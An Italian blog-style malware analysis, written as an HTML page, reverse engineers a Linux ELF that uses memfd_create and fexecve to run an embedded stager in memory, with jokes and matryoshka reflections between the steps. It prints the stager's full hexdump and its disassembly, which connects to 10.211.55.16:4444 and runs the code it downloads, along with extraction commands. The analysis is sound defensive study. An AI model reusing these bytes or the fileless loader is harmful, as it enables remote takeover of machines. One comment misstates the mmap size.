@@ -1,0 +1,367 @@
+<html>
+<head>
+<title>Spaghetti Hacker</title>
+<meta charset="utf-8">
+<style>
+    body {
+      color: #00FFFF;
+      background-color: #0c0d10;
+      margin: 0 auto;
+      padding: 1em 0 1em 0;
+    }
+@font-face { font-family: "gohu"; src: url("gohu.woff") format('woff'); }
+       pre { font-family: "gohu", "Lucida Console", monospace, Monaco; font-size: 14px; line-height: 1.0; }
+         a { color: #00FFFF; text-decoration: none; }
+</style>
+</head>
+<body>
+<center><div style="display: inline-block; text-align: left;"><pre>
+
+;questo report documenta il reverse engineering di un eseguibile ELF a 64 bit
+non "stripped", cioè con informazioni sui simboli. L'analisi è stata condotta
+utilizzando sia tecniche statiche che dinamiche per identificare le
+funzionalità del programma e il suo comportamento, con l'obiettivo di
+determinare la sua potenziale natura malevola. In genere scelgo a caso un
+eseguibile ELF, prendendolo dalla mia collezione di malware Linux e inizio ad
+analizzarlo non sapendo assolutamente nulla di quelle che possano essere le sue
+caratteristiche. Utilizzo vari strumenti automatici per semplificare l'analisi
+nelle fasi iniziali; analisi che si basa prevalentemente sul reverse
+engineering del codice assembly disassemblato.
+
+;4b060ab45f7acc1b2959dd5969f97a45d6fecd06f311763afbb864eaea4161e4: ELF 64-bit
+LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter
+/lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32,
+BuildID[sha1]=ee77cc98527691b00b5d6af2089a96deb32f6d11, not stripped
+
+;quello che una matrioska potrebbe esprimere è archetipico e complesso: l’idea
+di infinito. In questo tipo di indagine sulla realtà, di raffigurazione
+materica di concetti astratti, i Giapponesi sono maestri, di fatti la sua
+origine è attribuita proprio alle statuette di legno, l’una contenuta
+nell’altra, dell’isola di Honsu.
+
+;quando non sei in vena di fare battute, è il momento perfetto per fare una
+pausa… vado a schiacciare un pisolino; non vi preoccupate se lo sentite
+urlare.
+
+[0x004006f0]> s main
+[0x00400806]> pdf
+; DATA XREF from entry0 @ 0x40072d(r)
+;main (int argc, char **argv, char **envp);
+; var int64_t canary @ rbp-0x8
+; var int64_t var_10h @ rbp-0x10
+; var int64_t var_20h @ rbp-0x20
+; var void *ptr @ rbp-0x28
+; var int64_t fd @ rbp-0x2c
+0x00400806 push rbp
+0x00400807 mov rbp, rsp
+0x0040080a sub rsp, 0x30
+0x0040080e mov rax, qword fs:[0x28]
+0x00400817 mov qword [canary], rax
+0x0040081b xor eax, eax
+0x0040081d mov rax, qword [obj.stdin] ; obj.stdin__GLIBC_2.2.5
+; [0x601090:8]=0
+0x00400824 mov esi, 0 ; char *buf
+0x00400829 mov rdi, rax ; FILE *stream
+0x0040082c call sym.imp.setbuf ; void setbuf(FILE *stream, char *buf)
+0x00400831 mov rax, qword [obj.stdout] ; obj.stdout__GLIBC_2.2.5
+; [0x601080:8]=0
+0x00400838 mov esi, 0 ; char *buf
+0x0040083d mov rdi, rax ; FILE *stream
+0x00400840 call sym.imp.setbuf ; void setbuf(FILE *stream, char *buf)
+0x00400845 mov rax, qword [obj.stderr] ; obj.stderr__GLIBC_2.2.5
+; [0x6010a0:8]=0
+0x0040084c mov esi, 0 ; char *buf
+0x00400851 mov rdi, rax ; FILE *stream
+0x00400854 call sym.imp.setbuf ; void setbuf(FILE *stream, char *buf)
+
+;disabilita il buffering per gli stream standard stdin, stdout e stderr.
+Disabilitare il buffering degli stream standard nei malware (e anche in altri
+tipi di software dannoso) è una tecnica comune per ottenere un controllo più
+immediato e preciso sulle operazioni di input e output. In un contesto normale,
+i flussi standard come stdout (output) sono bufferizzati per ottimizzare le
+prestazioni: il sistema operativo accumula l'output in un buffer e lo scrive a
+destinazione solo quando il buffer è pieno o quando il programma termina. È una
+tecnica utilizzata per garantire un'esecuzione più controllata, reattiva e
+tempestiva. Questo è particolarmente importante per mantenere un flusso di
+comunicazione stabile e immediato tra il malware e i sistemi esterni, prevenire
+la perdita di dati e ridurre il rischio di comportamenti anomali o di arresti
+imprevisti.
+
+;l’idea di qualcosa contenuto in qualcos’altro, che a sua volta contiene
+qualcosa di più piccolo e così via, richiama l’idea della reductio ad
+infinitum.
+
+0x00400859 mov qword [var_20h], 0
+0x00400861 mov qword [var_10h], 0
+0x00400869 call sym.imp.getpid ; int getpid(void)
+0x0040086e mov esi, eax
+0x00400870 mov edi, str.pid__d ; 0x400978 ; "pid,%d" ; const char *format
+0x00400875 mov eax, 0
+0x0040087a call sym.imp.printf ; int printf(const char *format)
+
+;ottiene il pid del processo e lo stampa; perchè fa sta cosa? non l'ho capito.
+
+0x0040087f mov edx, 1
+0x00400884 mov esi, str.no_elf ; 0x40097f ; "no_elf"
+0x00400889 mov edi, 0x13f ; 319
+0x0040088e mov eax, 0
+0x00400893 call sym.imp.syscall
+
+;319 è il numero della syscall per memfd_create. Questo blocco di codice sta
+creando un file in memoria chiamato "no_elf" utilizzando la syscall
+memfd_create con il flag impostato a 1. Il file descriptor risultante dalla
+chiamata sarà restituito, consentendo di utilizzare il file in memoria per
+scopi specifici, come l'interprocess communication o la memorizzazione
+temporanea dei dati.
+
+;la syscall è memfd_create (numero 319).
+;il nome del file in memoria è "no_elf", passato tramite esi.
+;il flag è 1, passato tramite edx.
+
+;il risultato della syscall darà un file descriptor che può essere utilizzato
+per accedere al file in memoria creato. Quando viene chiamata la syscall
+memfd_create (numero 319) e impostato il flag a 1 (passato tramite il registro
+edx), significa che si sta attivando l'opzione MFD_CLOEXEC. Se il processo crea
+un nuovo programma con exec(), il file descriptor non sarà ereditato dal nuovo
+processo. Questo è utile per evitare che file aperti non necessari vengano
+ereditati, aumentando così la sicurezza ed evitando la condivisione accidentale
+di risorse tra processi.
+
+;la metà della metà della metà, i numeri periodici, l’inesprimibile piccolezza
+delle micro- particelle atomiche: se rimpicciolissimo le matrioske contenute
+l’una dentro l’altra all’infinito, incapperemmo nell’idea di infinitamente
+piccolo, microscopico.
+
+;oggi non sono in vena di fare battute, ma non preoccupatevi: ho una vasta
+collezione di sguardi perplessi da esibire!
+
+0x00400898 mov dword [fd], eax
+0x0040089b mov eax, dword [fd]
+0x0040089e mov edx, 0x100 ; 256 ; size_t nbytes
+0x004008a3 mov esi, 0x400988 ; const char *ptr
+0x004008a8 mov edi, eax ; int fd
+0x004008aa call sym.imp.write ; ssize_t write(int fd, const char *ptr, size_t
+nbytes)
+
+;ottiene il file descriptor del file creato in memoria e va a scriverci 256
+byte presenti in questa locazione di memoria 0x400988, che si riferisce a una
+parte della sezione .rodata.
+
+;il blocco di dati di 256 byte che inizia con un header ELF valido e include i
+vari campi e le informazioni necessari per identificare e utilizzare il file
+eseguibile ELF. È fondamentale che la sequenza di byte e i loro valori siano
+coerenti con le specifiche del formato ELF, il che sembra essere il caso in
+questa situazione.
+
+0x004008af lea rdx, [var_10h]
+0x004008b3 lea rcx, [var_20h]
+0x004008b7 mov eax, dword [fd]
+0x004008ba mov rsi, rcx
+0x004008bd mov edi, eax
+0x004008bf call sym.imp.fexecve
+
+;va ad eseguire dalla memoria, i 256 byte del file che è stato copiato dalla
+.rodata.
+
+0x004008c4 mov rax, qword [ptr]
+0x004008c8 mov rdi, rax ; void *ptr
+0x004008cb call sym.imp.free ; void free(void *ptr)
+
+0x004008d0 mov eax, 0
+0x004008d5 mov rcx, qword [canary]
+0x004008d9 xor rcx, qword fs:[0x28]
+0x004008e2 je 0x4008e9
+0x004008e4 call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
+
+;controllo del canarino sullo stack
+
+;ugualmente, possiamo invertire il senso di apertura della bambola e
+prolungarla all’infinito verso la grandezza. Qualcosa di grande che è sua volta
+è contenuto da qualcosa di più grande, ad libitum.
+;libidine, doppia libidine, libidine con i fiocchi!
+
+0x004008e9 leave
+0x004008ea ret
+
+;objcopy --dump-section .rodata=rodata.bin
+4b060ab45f7acc1b2959dd5969f97a45d6fecd06f311763afbb864eaea4161e4
+;hexdump -C rodata.bin
+;dd if=rodata.bin of=extracted_rodata.bin bs=1 skip=24
+;file extracted_rodata.bin
+;r2 ./extracted_rodata.bin
+
+;comandi per estrarre dalla sezione .rodata del malware, il file elf da 256
+byte.
+;all'interno della matrioska non c'era un'altra matrioska, ma un elf che si
+chiama no_elf. Come un vaccinato no vax o un promoter della Nike no global.
+
+[0x00400806]> px 256 @ 0x400988
+- offset - 8889 8A8B 8C8D 8E8F 9091 9293 9495 9697 89ABCDEF01234567
+0x00400988 7f45 4c46 0201 0100 0000 0000 0000 0000 .ELF............
+0x00400998 0200 3e00 0100 0000 7800 4000 0000 0000 ..>.....x.@.....
+0x004009a8 4000 0000 0000 0000 0000 0000 0000 0000 @...............
+0x004009b8 0000 0000 4000 3800 0100 0000 0000 0000 ....@.8.........
+0x004009c8 0100 0000 0700 0000 0000 0000 0000 0000 ................
+0x004009d8 0000 4000 0000 0000 0000 4000 0000 0000 ..@.......@.....
+0x004009e8 fa00 0000 0000 0000 7c01 0000 0000 0000 ........|.......
+0x004009f8 0010 0000 0000 0000 4831 ff6a 0958 99b6 ........H1.j.X..
+0x00400a08 1048 89d6 4d31 c96a 2241 5ab2 070f 0548 .H..M1.j"AZ....H
+0x00400a18 85c0 7851 6a0a 4159 506a 2958 996a 025f ..xQj.AYPj)X.j._
+0x00400a28 6a01 5e0f 0548 85c0 783b 4897 48b9 0200 j.^..H..x;H.H...
+0x00400a38 115c 0ad3 3710 5148 89e6 6a10 5a6a 2a58 .\..7.QH..j.Zj*X
+0x00400a48 0f05 5948 85c0 7925 49ff c974 1857 6a23 ..YH..y%I..t.Wj#
+0x00400a58 586a 006a 0548 89e7 4831 f60f 0559 595f Xj.j.H..H1...YY_
+0x00400a68 4885 c079 c76a 3c58 6a01 5f0f 055e 6a26 H..y.j<xj._..^j&
+0x00400a78 5a0f 0548 85c0 78ed ffe6 0000 011b 033b Z..H..x........;
+
+;ecco il disassemblato del file elf estratto dalla sezione .rodata del
+malware.
+
+[0x00400078]> pdf
+;-- rip:
+0 (int64_t arg3);
+; arg int64_t arg3 @ rdx
+0x00400078 xor rdi, rdi
+0x0040007b push 9 ; 9
+0x0040007d pop rax
+0x0040007e cdq
+0x0040007f mov dh, 0x10 ; 16
+0x00400081 mov rsi, rdx ; arg3
+0x00400084 xor r9, r9
+0x00400087 push 0x22 ; '\"' ; 34
+0x00400089 pop r10
+0x0040008b mov dl, 7
+0x0040008d syscall
+
+;la syscall effettuata è mmap con i seguenti argomenti:
+
+;rdi = 0 → Indirizzo suggerito (il kernel sceglierà un indirizzo).
+;rsi = 16 → Dimensione della memoria da allocare (16 byte).
+;rdx = 7 → Protezione della memoria (lettura, scrittura, esecuzione).
+;r10 = 34 → Flag (MAP_PRIVATE | MAP_ANONYMOUS).
+;r9 = 0 → File descriptor (non associato a file).
+;r8 = 0 → Offset (non usato perché non si mappa un file).
+
+0x0040008f test rax, rax
+0x00400092 js 0x4000e5
+
+;se la chiamata mmap fallisce (ossia, rax è negativo), il flusso salta a un
+gestore di error.
+
+0x00400094 push 0xa ; 10
+0x00400096 pop r9
+0x00400098 push rax
+0x00400099 push 0x29 ; ')' ; 41
+0x0040009b pop rax
+0x0040009c cdq
+
+;se eax è positivo, edx viene impostato a 0; se eax è negativo, edx viene
+impostato a 0xFFFFFFFF (cioè, tutti i bit a 1).
+
+0x0040009d push 2 ; 2
+0x0040009f pop rdi
+0x004000a0 push 1 ; 1
+0x004000a2 pop rsi
+0x004000a3 syscall
+
+;41 sys_socket int family int type int protocol.
+;qui si sta creando un socket di tipo SOCK_STREAM (TCP) usando socket().
+
+0x004000a5 test rax, rax
+0x004000a8 js 0x4000e5
+
+;se il socket non viene creato correttamente, il flusso salta di nuovo al
+gestore di errori.
+
+0x004000aa xchg rdi, rax
+
+0x004000ac movabs rcx, 0x1037d30a5c110002
+0x004000b6 push rcx
+0x004000b7 mov rsi, rsp
+0x004000ba push 0x10 ; 16
+0x004000bc pop rdx
+0x004000bd push 0x2a ; '*' ; 42
+0x004000bf pop rax
+0x004000c0 syscall
+
+;42 sys_connect int fd struct sockaddr *uservaddr int addrlen
+;qui il codice si prepara per la chiamata connect() per collegarsi
+all'indirizzo IP 10.211.55.16 sulla porta 4444, come abbiamo discusso in
+precedenza.
+;0x1037d30a5c11 115c è 4444, mentro l'ip 0a (10) d3 (211) 37 (55) 10 (16),
+essendo in little endian.
+;0x02: Questo rappresenta sin_family, che indica la famiglia dell'indirizzo.
+Per i socket IPv4, sin_family è comunemente impostato a AF_INET, che è 2 in
+decimal (quindi 0x02 in hex).
+
+0x004000c2 pop rcx
+0x004000c3 test rax, rax
+0x004000c6 jns 0x4000ed
+
+;se la connessione ha successo, salta al codice successivo
+
+0x004000c8 dec r9
+0x004000cb je 0x4000e5
+
+;fa 10 tentativi, se falliscono tutti salta al blocco dell'exit.
+
+0x004000cd push rdi
+0x004000ce push 0x23 ; '#' ; 35
+0x004000d0 pop rax
+0x004000d1 push 0
+0x004000d3 push 5 ; 5
+0x004000d5 mov rdi, rsp
+0x004000d8 xor rsi, rsi
+0x004000db syscall
+
+;35 sys_nanosleep struct timespec *rqtp struct timespec *rmtp
+;dovrebbe sleeppare per 5 secondi.
+
+0x004000dd pop rcx
+0x004000de pop rcx
+0x004000df pop rdi
+0x004000e0 test rax, rax
+0x004000e3 jns 0x4000ac
+
+;controlla se ha fallito la nanosleep, se non è fallita torna indietro e
+riprova a connettersi.
+
+0x004000e5 push 0x3c ; '<' ; 60
+0x004000e7 pop rax
+0x004000e8 push 1 ; 1
+0x004000ea pop rdi
+0x004000eb syscall
+
+;60 sys_exit int error_code
+;blocco di uscita con errore.
+
+0x004000ed pop rsi
+0x004000ee push 0x26 ; '&' ; 38
+0x004000f0 pop rdx
+0x004000f1 syscall
+
+;viene la read passandogli l'indirizzo in rsi (che è la cima dello stack) come
+buffer; in rdi abbiamo l'fd aperto, poi con jmp rsi si va ad eseguire proprio
+quei 38 byte appena scaricati.
+;la sequenza di chiamate di sistema porta alla lettura di un payload remoto e
+alla sua esecuzione. Se ci sono errori durante la lettura, il codice esegue un
+salto a un gestore di errori. Ma se tutto va a buon fine, il codice scaricato
+verrà eseguito, consentendo al potenziale attaccante di controllare il
+sistema.
+
+;gestire gli errori? È facile! Basta ignorarli finché non diventano abbastanza
+grandi da invitarti a cena!
+
+0x004000f3 test rax, rax
+0x004000f6 js 0x4000e5
+0x004000f8 jmp rsi
+
+;qui dovrebbe saltare al codice che viene scaricato.
+
+;giocando a prolungare le matrioske, ci siamo spinti oltre le nostre umane
+capacità di comprensione. Ci siamo ritrovati ad un passo dall’abisso
+dell’inconcepibile, oscillare al vertice del quasi eterno e provare un senso di
+vertigine ed impotenza.
+
+>> 
+</pre></div></center></body></html>
